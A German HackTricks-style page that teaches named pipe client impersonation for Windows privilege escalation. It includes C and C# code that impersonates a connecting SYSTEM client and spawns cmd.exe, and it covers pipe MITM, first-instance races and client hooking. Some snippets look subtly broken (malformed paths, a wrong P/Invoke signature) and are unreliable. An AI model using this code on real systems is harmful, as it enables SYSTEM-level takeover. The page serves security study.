# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe Client Impersonation ist ein local privilege escalation primitive, mit dem ein Named-Pipe-Serverthread den Sicherheitskontext eines Clients übernehmen kann, der eine Verbindung zu ihm herstellt. In der Praxis kann ein Angreifer, der Code mit SeImpersonatePrivilege ausführen kann, einen privilegierten Client (z. B. einen SYSTEM-Dienst) dazu bringen, eine vom Angreifer kontrollierte Pipe zu verbinden, ImpersonateNamedPipeClient aufzurufen, das resultierende Token in ein primary token zu duplizieren und einen Prozess als Client zu starten (häufig NT AUTHORITY\SYSTEM).<sup>[[2]](#references)</sup>

Diese Seite konzentriert sich auf die Kerntechnik. Für vollständige exploit chains, die SYSTEM dazu bringen, eine Verbindung zu deiner Pipe herzustellen, siehe die unten referenzierten Potato-Familienseiten.

## TL;DR
- Eine named pipe erstellen: \\.\pipe\<random> und auf eine Verbindung warten.
- Eine privilegierte Komponente dazu bringen, eine Verbindung herzustellen (spooler/DCOM/EFSRPC/etc.).
- Mindestens eine Nachricht aus der Pipe lesen und anschließend ImpersonateNamedPipeClient aufrufen.
- Das impersonation token vom aktuellen Thread öffnen, mit DuplicateTokenEx(TokenPrimary) duplizieren und mit CreateProcessWithTokenW/CreateProcessAsUser einen Prozess als SYSTEM starten.<sup>[[2]](#references)</sup>

## Voraussetzungen und wichtige APIs
- Vom aufrufenden Prozess/Thread typischerweise benötigte Privilegien:
- SeImpersonatePrivilege, um einen verbundenen Client erfolgreich zu impersonieren und CreateProcessWithTokenW zu verwenden.
- Alternativ kann nach der Impersonation von SYSTEM CreateProcessAsUser verwendet werden, wofür möglicherweise SeAssignPrimaryTokenPrivilege und SeIncreaseQuotaPrivilege erforderlich sind (diese sind erfüllt, wenn du SYSTEM impersonierst).
- Verwendete Core-APIs:<sup>[[1]](#references)[[4]](#references)</sup>
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (vor der Impersonation muss mindestens eine Nachricht gelesen werden)
- ImpersonateNamedPipeClient und RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW oder CreateProcessAsUser
- Impersonation level: Für nützliche lokale Aktionen muss der Client SecurityImpersonation zulassen (Standard bei vielen lokalen RPC/named-pipe clients). Clients können dies beim Öffnen der Pipe mit SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION herabsetzen.<sup>[[3]](#references)</sup>

## Minimaler Win32-Workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Hinweise:
- Wenn ImpersonateNamedPipeClient ERROR_CANNOT_IMPERSONATE (1368) zurückgibt, stelle sicher, dass du zuerst aus der Pipe liest und der Client die Impersonation nicht auf die Identification level beschränkt hat.
- Bevorzuge DuplicateTokenEx mit SecurityImpersonation und TokenPrimary, um ein primäres Token zu erstellen, das für die Prozesserstellung geeignet ist.

## .NET-Kurzbeispiel
In .NET kann NamedPipeServerStream über RunAsClient impersonieren. Sobald die Impersonation aktiv ist, dupliziere das Thread-Token und erstelle einen Prozess.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Häufige Trigger/Coercions, um SYSTEM zu Ihrer Pipe zu bekommen
Diese Techniken zwingen privilegierte Services dazu, sich mit Ihrer Named Pipe zu verbinden, sodass Sie sie impersonieren können:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Eine detaillierte Übersicht zu Verwendung und Kompatibilität finden Sie hier:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Wenn Sie lediglich ein vollständiges Beispiel für das Erstellen der Pipe und das Impersonieren benötigen, um SYSTEM über einen Service-Trigger zu starten, siehe:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (ACLs, First-Instance Races, Client Hooking)

Wenn ein privilegierter Service und ein Prozess mit niedrigen Privilegien über `\\.\pipe\...` kommunizieren, behandeln Sie die Pipe wie jede andere nicht vertrauenswürdige IPC-Grenze. Neben der klassischen serverseitigen Impersonation können schwache Pipe-ACLs, unsichere Erstellungs-Flags und Vertrauensentscheidungen auf Client-Seite ebenfalls als lokale Privilege-Escalation-Primitives dienen.<sup>[[7]](#references)</sup>

### Zuerst geeignete Pipes enumerieren
- Pipes schnell über PowerShell auflisten: `Get-ChildItem \\.\pipe\`
- `pipelist64.exe` von Sysinternals ist nützlich, um die Anzahl der Instanzen und Pipes mit nur einer Instanz zu erkennen.
- Priorisieren Sie Namen, die von Services verwendet werden, die als `SYSTEM` ausgeführt werden, insbesondere von Helpers, Updatern, Launchern und UI-Brokern.

### MITM über freizügige DACLs und zusätzliche Pipe-Instanzen
- Jeder Prozess, der mit einem privilegierten Server kommunizieren kann, kann dessen Protokoll bereits fuzzing unterziehen und nach privilegierten Verben suchen.<sup>[[7]](#references)</sup>
- Der interessantere Fall tritt ein, wenn die DACL `FILE_GENERIC_WRITE`/`GENERIC_WRITE` auf dem Pipe-Objekt gewährt. Bei Named Pipes schließt dies implizit `FILE_CREATE_PIPE_INSTANCE` ein (`FILE_APPEND_DATA` verwendet dasselbe Bit), sodass ein Angreifer eine weitere Server-Instanz mit demselben Namen erstellen kann.
- Da Instanzen in FIFO-Reihenfolge zugeordnet werden, können vom Angreifer erstellte und legitime Instanzen miteinander verschachtelt werden: Erstellen Sie mit `CreateNamedPipe` eine Rogue-Instanz, öffnen Sie anschließend denselben Pipe-Namen mit `CreateFile` und warten Sie, bis ein echter Client auf der Rogue-Server-Instanz landet.
- Ergebnis: Privilegierte IPC beobachten, verändern, weiterleiten oder desynchronisieren, ohne den ursprünglichen Server-Prozess übernehmen zu müssen.

### First-Instance-Race bei Pipe-Sicherheitsdeskriptoren
- `lpSecurityAttributes` definiert die DACL nur, wenn die erste Instanz eines Pipe-Namens erstellt wird.<sup>[[4]](#references)[[7]](#references)</sup>
- Wenn ein privilegierter Service spät startet und `FILE_FLAG_FIRST_PIPE_INSTANCE` nicht verwendet, kann ein Angreifer den Pipe-Namen vorab mit einer freizügigen DACL erstellen und den Service anschließend weitere Instanzen unter dem vom Angreifer bestimmten Sicherheitskontext erstellen lassen.
- Dadurch wird der Service-Start zu einer Race Condition: Gewinnen Sie die erste Instanz und verbinden Sie sich anschließend mit späteren Clients oder führen Sie gegen sie einen MITM mit der geschwächten ACL durch.
- Mitigation für Defender und ein wichtiger Prüfpunkt für Angreifer: Prüfen Sie, ob `CreateNamedPipe(..., dwOpenMode, ...)` `FILE_FLAG_FIRST_PIPE_INSTANCE` enthält. Falls nicht, testen Sie die Vorab-Erstellung, bevor der Service startet.

### PID-/Signaturprüfungen sind Hardening, keine Grenze
- Einige Produkte versuchen, den Zugriff einzuschränken, indem sie `GetNamedPipeClientProcessId`, den Pfad des Prozessabbilds oder den Authenticode-Signer des sich verbindenden Clients prüfen.<sup>[[7]](#references)</sup>
- Dies hilft nur so lange, bis Sie in den legitimen Client injizieren: Sobald Sie sich innerhalb des vertrauenswürdigen Prozesses befinden, übernehmen Sie exakt den PID-/Image-/Signaturkontext, den der Server erwartet.
- Bei Split-Desktop-Apps ist es oft einfacher, den UI-/Helper-Prozess mit niedrigen Privilegien zu instrumentieren, als den `SYSTEM`-Service direkt anzugreifen.

### Den Client entsprechend seinem I/O-Modell hooken
- Synchrone I/O: `NtWriteFile` abfangen, bevor der Syscall den Buffer verarbeitet, und `NtReadFile` nach dessen Rückkehr prüfen/patchen.<sup>[[7]](#references)</sup>
- Overlapped I/O: Das in `NtReadFile` beobachtete `OVERLAPPED`/`IoStatusBlock` speichern und anschließend den Buffer prüfen, nachdem `GetOverlappedResult` oder der relevante Wait abgeschlossen ist.
- Completion Ports: `GetQueuedCompletionStatus` erreicht `NtRemoveIoCompletion`; der zurückgegebene `ApcContext` verweist auf das `OVERLAPPED`, das beim ursprünglichen Read verwendet wurde. Dies ist der richtige Ansatzpunkt, um den nun befüllten Buffer zu finden.
- Completion-Routinen (`ReadFileEx`): Der Completion-Callback wird als APC zugestellt. Wenn Sie zurückgegebene Daten manipulieren oder synthetische Antworten injizieren möchten, hooken Sie die echte Completion-Routine und verwenden Sie für benutzerdefinierte Injections einen `QueueUserAPC`-Dispatcher mit einem Argument, der die drei erwarteten Argumente der Routine rekonstruiert.<sup>[[5]](#references)[[7]](#references)</sup>

### Hinweise zu den Tools
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) proxyt Named-Pipe-Traffic über eine injizierte Helper-DLL und stellt einen Burp-ähnlichen Workflow zum Bearbeiten und Replay bereit.<sup>[[6]](#references)</sup>
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) verfolgt einen Frida-basierten Ansatz und konzentriert sich auf das Hooken von `NtReadFile`/`NtWriteFile` sowie der oben beschriebenen Async-/Completion-Ansatzpunkte. Anschließend leitet es den Traffic an einen WebSocket-basierten Bearbeitungs-Workflow weiter.<sup>[[7]](#references)[[8]](#references)</sup>
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Betriebliche Überlegungen
- Named Pipes haben eine geringe Latenz; lange Pausen beim Bearbeiten von Puffern können fragile Dienste in einen Deadlock versetzen.<sup>[[7]](#references)</sup>
- Clients, die Overlapped I/O, Completion Ports oder APCs verwenden, benötigen andere Hooks als einfache Umleitungen von `ReadFile`/`WriteFile`.
- Die Injection in den vertrauenswürdigen Client ist auffällig und sollte im Allgemeinen der exploit development, dem Protocol Reversing oder dem Fuzzing in lokalen Labs vorbehalten bleiben.

## Fehlerbehebung und Stolpersteine
- Du musst mindestens eine Nachricht aus der Pipe lesen, bevor du `ImpersonateNamedPipeClient` aufrufst; andernfalls erhältst du `ERROR_CANNOT_IMPERSONATE (1368)`.<sup>[[1]](#references)</sup>
- Wenn der Client eine Verbindung mit `SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION` herstellt, kann der Server ihn nicht vollständig impersonifizieren; prüfe die Impersonation-Ebene des Tokens mit `GetTokenInformation(TokenImpersonationLevel)`.<sup>[[3]](#references)</sup>
- `CreateProcessWithTokenW` erfordert `SeImpersonatePrivilege` für den Aufrufer. Wenn dies mit `ERROR_PRIVILEGE_NOT_HELD (1314)` fehlschlägt, verwende `CreateProcessAsUser`, nachdem du bereits als SYSTEM impersonifiziert hast.
- Stelle sicher, dass der Security Descriptor deiner Pipe dem Zieldienst die Verbindung erlaubt, wenn du ihn härtest; standardmäßig sind Pipes unter `\\.\pipe` entsprechend der DACL des Servers zugänglich.<sup>[[3]](#references)</sup>

## Referenzen

- [1] [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [3] [Microsoft: Named Pipe Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [4] [Microsoft: CreateNamedPipe function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [5] [Microsoft: Named Pipe Server Using Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [6] [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [7] [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [8] [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
